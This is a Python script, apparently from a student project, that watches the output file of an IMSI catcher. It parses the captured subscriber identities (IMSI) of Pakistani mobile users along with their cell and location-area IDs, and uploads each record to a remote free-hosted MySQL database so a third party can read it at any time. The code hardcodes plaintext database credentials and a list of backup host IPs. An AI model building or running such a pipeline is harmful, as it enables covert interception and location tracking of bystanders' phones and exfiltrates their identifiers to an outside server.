#!/usr/bin/env python3
"""
Cloud IMSI Writer - Direct to InfinityFree MySQL
With automatic retry and error handling
"""

import pymysql
import os
import re
import time
import socket
from datetime import datetime
from pathlib import Path

# ==========================================
# YOUR INFINITYFREE CLOUD DATABASE
# ==========================================
CLOUD_CONFIG = {
    'host': 'sql.freehosting.com',  # Try this first
    'port': 3306,
    'user': 'if0_41388991',
    'password': 'projectfyp',
    'database': 'if0_41388991_imsi_data',
}

# Backup hosts to try if main fails
BACKUP_HOSTS = [
    '185.27.134.176',
    '31.170.160.103',
    'mysql.0fees.net',
    'sql.byetcluster.com',
]

class CloudIMSIWriter:
    def __init__(self):
        self.conn = None
        self.current_host = CLOUD_CONFIG['host']
        self.last_position = 0
        self.total_uploaded = 0
        self.failed_attempts = 0
        
    def resolve_host(self, host):
        """Try to resolve hostname to IP"""
        try:
            ip = socket.gethostbyname(host)
            print(f"  ✅ {host} resolves to {ip}")
            return ip
        except:
            print(f"  ❌ Cannot resolve {host}")
            return None
    
    def try_connect(self, host):
        """Attempt connection with specific host"""
        try:
            print(f"🔌 Trying {host}...")
            
            # Test DNS first
            ip = self.resolve_host(host)
            if not ip and host != ip:
                return None
            
            conn = pymysql.connect(
                host=host,
                port=CLOUD_CONFIG['port'],
                user=CLOUD_CONFIG['user'],
                password=CLOUD_CONFIG['password'],
                database=CLOUD_CONFIG['database'],
                connect_timeout=10
            )
            print(f"✅ Connected to {host}")
            self.current_host = host
            return conn
        except Exception as e:
            print(f"❌ Failed: {e}")
            return None
    
    def connect_to_cloud(self):
        """Establish connection to cloud database"""
        # Try primary host first
        conn = self.try_connect(CLOUD_CONFIG['host'])
        if conn:
            self.conn = conn
            self.create_table_if_not_exists()
            return True
        
        # Try backup hosts
        for host in BACKUP_HOSTS:
            if host == CLOUD_CONFIG['host']:
                continue
            conn = self.try_connect(host)
            if conn:
                self.conn = conn
                self.create_table_if_not_exists()
                return True
        
        print("❌ All connection attempts failed")
        return False
    
    def ensure_connection(self):
        """Ensure we have a working connection"""
        try:
            if self.conn:
                self.conn.ping(reconnect=True)
                return True
        except:
            pass
        
        # Try to reconnect
        return self.connect_to_cloud()
    
    def create_table_if_not_exists(self):
        """Ensure the table exists"""
        try:
            cursor = self.conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS imsi_captures (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    timestamp DATETIME,
                    imsi VARCHAR(20),
                    operator VARCHAR(20),
                    mcc VARCHAR(3),
                    mnc VARCHAR(3),
                    cell_id INT,
                    lac INT,
                    source_ip VARCHAR(45),
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    INDEX idx_timestamp (timestamp),
                    INDEX idx_operator (operator)
                )
            """)
            self.conn.commit()
            print("✅ Table ready")
        except Exception as e:
            print(f"⚠️ Table creation warning: {e}")
    
    def parse_imsi_line(self, line):
        """Parse IMSI from your catcher output"""
        if not line or line.startswith('Nb IMSI') or line.startswith('stamp'):
            return None
        
        # Extract IMSI (410 06 XXXXXXX format)
        imsi_match = re.search(r'410\s+0[3467]\s+\d+', line)
        if not imsi_match:
            return None
        
        imsi_parts = imsi_match.group(0).split()
        mcc = imsi_parts[0]
        mnc = imsi_parts[1]
        imsi_number = imsi_parts[2]
        full_imsi = f"{mcc}{mnc}{imsi_number}"
        
        # Determine operator
        operator_map = {
            '06': 'Telenor',
            '04': 'Zong',
            '03': 'Ufone',
            '01': 'Jazz',
            '07': 'Jazz'
        }
        operator = operator_map.get(mnc, 'Unknown')
        
        # Extract timestamp
        timestamp = datetime.now()
        time_match = re.search(r'\d{4}-\d{2}-\d{2}[T ]\d{2}:\d{2}:\d{2}', line)
        if time_match:
            try:
                timestamp = datetime.fromisoformat(time_match.group(0).replace(' ', 'T'))
            except:
                pass
        
        # Extract cell/lac info
        lac = None
        cell_id = None
        cell_match = re.search(r'(\d+)\s*;\s*(\d+)\s*$', line)
        if cell_match:
            lac = cell_match.group(1)
            cell_id = cell_match.group(2)
        
        return {
            'timestamp': timestamp.strftime('%Y-%m-%d %H:%M:%S'),
            'imsi': full_imsi,
            'operator': operator,
            'mcc': mcc,
            'mnc': mnc,
            'cell_id': cell_id,
            'lac': lac,
            'source_ip': 'imsi_catcher'
        }
    
    def write_to_cloud(self, data):
        """Write a single IMSI record to cloud"""
        try:
            if not self.ensure_connection():
                return False
            
            cursor = self.conn.cursor()
            sql = """
                INSERT INTO imsi_captures 
                (timestamp, imsi, operator, mcc, mnc, cell_id, lac, source_ip)
                VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
            """
            cursor.execute(sql, (
                data['timestamp'],
                data['imsi'],
                data['operator'],
                data['mcc'],
                data['mnc'],
                data['cell_id'],
                data['lac'],
                data['source_ip']
            ))
            self.conn.commit()
            self.failed_attempts = 0
            return True
        except Exception as e:
            print(f"⚠️ Write error: {e}")
            self.failed_attempts += 1
            return False
    
    def monitor_and_upload(self):
        """Monitor imsi_output.txt and upload to cloud"""
        if not self.connect_to_cloud():
            print("❌ Cannot connect to cloud. Will retry every 60 seconds.")
        
        if not os.path.exists("imsi_output.txt"):
            Path("imsi_output.txt").touch()
            print("📁 Created imsi_output.txt")
        
        print("\n" + "="*70)
        print("☁️  CLOUD IMSI WRITER RUNNING")
        print("="*70)
        print(f"📡 Monitoring: imsi_output.txt")
        print(f"☁️  Uploading to: {self.current_host}")
        print(f"📊 Database: {CLOUD_CONFIG['database']}")
        print("="*70 + "\n")
        
        with open("imsi_output.txt", "r") as f:
            # Go to end of file
            f.seek(0, 2)
            self.last_position = f.tell()
            last_retry = time.time()
            
            while True:
                try:
                    line = f.readline()
                    if line:
                        data = self.parse_imsi_line(line)
                        if data:
                            if self.write_to_cloud(data):
                                self.total_uploaded += 1
                                print(f"  ☁️ [{self.total_uploaded}] {data['operator']}: ...{data['imsi'][-8:]}")
                            else:
                                print(f"  📦 Failed to upload: {data['operator']}")
                    else:
                        time.sleep(2)
                    
                    # Retry connection if needed
                    if self.failed_attempts > 3 and time.time() - last_retry > 60:
                        print("🔄 Retrying connection...")
                        self.connect_to_cloud()
                        last_retry = time.time()
                        self.failed_attempts = 0
                    
                except KeyboardInterrupt:
                    print(f"\n\n👋 Stopped. Total uploaded: {self.total_uploaded}")
                    if self.conn:
                        self.conn.close()
                    break
                except Exception as e:
                    print(f"⚠️ Error: {e}")
                    time.sleep(5)

if __name__ == "__main__":
    print("="*70)
    print("☁️  CLOUD IMSI WRITER - DIRECT TO INFINITYFREE")
    print("="*70)
    print("✅ No proxy, no ngrok, no VPN needed!")
    print("✅ Friend can access data 24/7 from anywhere")
    print("="*70)
    
    writer = CloudIMSIWriter()
    writer.monitor_and_upload()
